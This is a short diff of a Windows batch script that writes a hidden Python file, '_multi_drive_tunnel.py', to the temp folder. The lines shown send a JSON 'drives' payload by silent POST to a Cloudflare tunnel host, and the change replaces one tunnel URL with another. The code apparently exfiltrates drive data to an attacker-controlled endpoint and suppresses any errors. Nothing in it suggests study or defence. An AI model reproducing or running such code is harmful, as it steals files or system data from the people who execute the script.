@@ -87,7 +87,7 @@ set "TEMP_PY=%TEMP%\_multi_drive_tunnel.py"
 >> "%TEMP_PY%" echo     "drives": results
 >> "%TEMP_PY%" echo }
 >> "%TEMP_PY%" echo data = json.dumps(payload).encode()
->> "%TEMP_PY%" echo req = urllib.request.Request(" https://fitting-construction-atlanta-hop.trycloudflare.com/receive", data=data, headers={"Content-Type":"application/json"}, method="POST")
+>> "%TEMP_PY%" echo req = urllib.request.Request("https://pupils-favourites-acceptance-minimal.trycloudflare.com", data=data, headers={"Content-Type":"application/json"}, method="POST")
 >> "%TEMP_PY%" echo try:
 >> "%TEMP_PY%" echo     urllib.request.urlopen(req)
 >> "%TEMP_PY%" echo except: pass
